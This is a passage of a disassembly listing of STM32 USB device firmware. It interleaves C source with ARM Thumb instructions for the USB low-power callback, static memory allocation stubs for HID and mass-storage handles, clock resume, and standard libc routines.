      /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
    }
    break;
  }
}
 800d0fe:	e023      	b.n	800d148 <HAL_PCDEx_LPM_Callback+0x60>
    if (hpcd->Init.low_power_enable)
 800d100:	687b      	ldr	r3, [r7, #4]
 800d102:	699b      	ldr	r3, [r3, #24]
 800d104:	2b00      	cmp	r3, #0
 800d106:	d007      	beq.n	800d118 <HAL_PCDEx_LPM_Callback+0x30>
      SystemClockConfig_Resume();
 800d108:	f000 f84a 	bl	800d1a0 <SystemClockConfig_Resume>
      SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800d10c:	4b10      	ldr	r3, [pc, #64]	; (800d150 <HAL_PCDEx_LPM_Callback+0x68>)
 800d10e:	691b      	ldr	r3, [r3, #16]
 800d110:	4a0f      	ldr	r2, [pc, #60]	; (800d150 <HAL_PCDEx_LPM_Callback+0x68>)
 800d112:	f023 0306 	bic.w	r3, r3, #6
 800d116:	6113      	str	r3, [r2, #16]
    USBD_LL_Resume(hpcd->pData);
 800d118:	687b      	ldr	r3, [r7, #4]
 800d11a:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800d11e:	4618      	mov	r0, r3
 800d120:	f7fe fa66 	bl	800b5f0 <USBD_LL_Resume>
    break;
 800d124:	e010      	b.n	800d148 <HAL_PCDEx_LPM_Callback+0x60>
    USBD_LL_Suspend(hpcd->pData);
 800d126:	687b      	ldr	r3, [r7, #4]
 800d128:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800d12c:	4618      	mov	r0, r3
 800d12e:	f7fe fa43 	bl	800b5b8 <USBD_LL_Suspend>
    if (hpcd->Init.low_power_enable)
 800d132:	687b      	ldr	r3, [r7, #4]
 800d134:	699b      	ldr	r3, [r3, #24]
 800d136:	2b00      	cmp	r3, #0
 800d138:	d005      	beq.n	800d146 <HAL_PCDEx_LPM_Callback+0x5e>
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800d13a:	4b05      	ldr	r3, [pc, #20]	; (800d150 <HAL_PCDEx_LPM_Callback+0x68>)
 800d13c:	691b      	ldr	r3, [r3, #16]
 800d13e:	4a04      	ldr	r2, [pc, #16]	; (800d150 <HAL_PCDEx_LPM_Callback+0x68>)
 800d140:	f043 0306 	orr.w	r3, r3, #6
 800d144:	6113      	str	r3, [r2, #16]
    break;
 800d146:	bf00      	nop
}
 800d148:	bf00      	nop
 800d14a:	3708      	adds	r7, #8
 800d14c:	46bd      	mov	sp, r7
 800d14e:	bd80      	pop	{r7, pc}
 800d150:	e000ed00 	.word	0xe000ed00

0800d154 <USBD_static_malloc>:
  * @brief  Static single allocation.
  * @param  size: Size of allocated memory
  * @retval None
  */
void *USBD_static_malloc(uint32_t size)
{
 800d154:	b480      	push	{r7}
 800d156:	b083      	sub	sp, #12
 800d158:	af00      	add	r7, sp, #0
 800d15a:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_CUSTOM_HID_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800d15c:	4b03      	ldr	r3, [pc, #12]	; (800d16c <USBD_static_malloc+0x18>)
}
 800d15e:	4618      	mov	r0, r3
 800d160:	370c      	adds	r7, #12
 800d162:	46bd      	mov	sp, r7
 800d164:	f85d 7b04 	ldr.w	r7, [sp], #4
 800d168:	4770      	bx	lr
 800d16a:	bf00      	nop
 800d16c:	20000e74 	.word	0x20000e74

0800d170 <USBD_static_malloc_MSC>:

void *USBD_static_malloc_MSC(uint32_t size)
{
 800d170:	b480      	push	{r7}
 800d172:	b083      	sub	sp, #12
 800d174:	af00      	add	r7, sp, #0
 800d176:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_MSC_BOT_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800d178:	4b03      	ldr	r3, [pc, #12]	; (800d188 <USBD_static_malloc_MSC+0x18>)
}
 800d17a:	4618      	mov	r0, r3
 800d17c:	370c      	adds	r7, #12
 800d17e:	46bd      	mov	sp, r7
 800d180:	f85d 7b04 	ldr.w	r7, [sp], #4
 800d184:	4770      	bx	lr
 800d186:	bf00      	nop
 800d188:	20000e9c 	.word	0x20000e9c

0800d18c <USBD_static_free>:
  * @brief  Dummy memory free
  * @param  p: Pointer to allocated  memory address
  * @retval None
  */
void USBD_static_free(void *p)
{
 800d18c:	b480      	push	{r7}
 800d18e:	b083      	sub	sp, #12
 800d190:	af00      	add	r7, sp, #0
 800d192:	6078      	str	r0, [r7, #4]

}
 800d194:	bf00      	nop
 800d196:	370c      	adds	r7, #12
 800d198:	46bd      	mov	sp, r7
 800d19a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800d19e:	4770      	bx	lr

0800d1a0 <SystemClockConfig_Resume>:
  * @brief  Configures system clock after wake-up from USB resume callBack:
  *         enable HSI, PLL and select PLL as system clock source.
  * @retval None
  */
static void SystemClockConfig_Resume(void)
{
 800d1a0:	b580      	push	{r7, lr}
 800d1a2:	af00      	add	r7, sp, #0
  SystemClock_Config();
 800d1a4:	f7f3 fa56 	bl	8000654 <SystemClock_Config>
}
 800d1a8:	bf00      	nop
 800d1aa:	bd80      	pop	{r7, pc}

0800d1ac <memset>:
 800d1ac:	4402      	add	r2, r0
 800d1ae:	4603      	mov	r3, r0
 800d1b0:	4293      	cmp	r3, r2
 800d1b2:	d100      	bne.n	800d1b6 <memset+0xa>
 800d1b4:	4770      	bx	lr
 800d1b6:	f803 1b01 	strb.w	r1, [r3], #1
 800d1ba:	e7f9      	b.n	800d1b0 <memset+0x4>

0800d1bc <__libc_init_array>:
 800d1bc:	b570      	push	{r4, r5, r6, lr}
 800d1be:	4d0d      	ldr	r5, [pc, #52]	; (800d1f4 <__libc_init_array+0x38>)
 800d1c0:	4c0d      	ldr	r4, [pc, #52]	; (800d1f8 <__libc_init_array+0x3c>)
 800d1c2:	1b64      	subs	r4, r4, r5
 800d1c4:	10a4      	asrs	r4, r4, #2
 800d1c6:	2600      	movs	r6, #0
 800d1c8:	42a6      	cmp	r6, r4
 800d1ca:	d109      	bne.n	800d1e0 <__libc_init_array+0x24>
 800d1cc:	4d0b      	ldr	r5, [pc, #44]	; (800d1fc <__libc_init_array+0x40>)
 800d1ce:	4c0c      	ldr	r4, [pc, #48]	; (800d200 <__libc_init_array+0x44>)
 800d1d0:	f000 f826 	bl	800d220 <_init>
 800d1d4:	1b64      	subs	r4, r4, r5
 800d1d6:	10a4      	asrs	r4, r4, #2
 800d1d8:	2600      	movs	r6, #0
 800d1da:	42a6      	cmp	r6, r4
 800d1dc:	d105      	bne.n	800d1ea <__libc_init_array+0x2e>
 800d1de:	bd70      	pop	{r4, r5, r6, pc}
 800d1e0:	f855 3b04 	ldr.w	r3, [r5], #4
 800d1e4:	4798      	blx	r3
 800d1e6:	3601      	adds	r6, #1
 800d1e8:	e7ee      	b.n	800d1c8 <__libc_init_array+0xc>
 800d1ea:	f855 3b04 	ldr.w	r3, [r5], #4
 800d1ee:	4798      	blx	r3
 800d1f0:	3601      	adds	r6, #1
 800d1f2:	e7f2      	b.n	800d1da <__libc_init_array+0x1e>
 800d1f4:	0800d474 	.word	0x0800d474
 800d1f8:	0800d474 	.word	0x0800d474
 800d1fc:	0800d474 	.word	0x0800d474
 800d200:	0800d478 	.word	0x0800d478

0800d204 <memcpy>:
 800d204:	440a      	add	r2, r1
 800d206:	4291      	cmp	r1, r2
 800d208:	f100 33ff 	add.w	r3, r0, #4294967295
 800d20c:	d100      	bne.n	800d210 <memcpy+0xc>
 800d20e:	4770      	bx	lr
 800d210:	b510      	push	{r4, lr}
 800d212:	f811 4b01 	ldrb.w	r4, [r1], #1
 800d216:	f803 4f01 	strb.w	r4, [r3, #1]!
 800d21a:	4291      	cmp	r1, r2
 800d21c:	d1f9      	bne.n	800d212 <memcpy+0xe>
 800d21e:	bd10      	pop	{r4, pc}

0800d220 <_init>:
 800d220:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d222:	bf00      	nop
 800d224:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d226:	bc08      	pop	{r3}
 800d228:	469e      	mov	lr, r3
 800d22a:	4770      	bx	lr

0800d22c <_fini>:
 800d22c:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d22e:	bf00      	nop
 800d230:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d232:	bc08      	pop	{r3}
 800d234:	469e      	mov	lr, r3
 800d236:	4770      	bx	lr
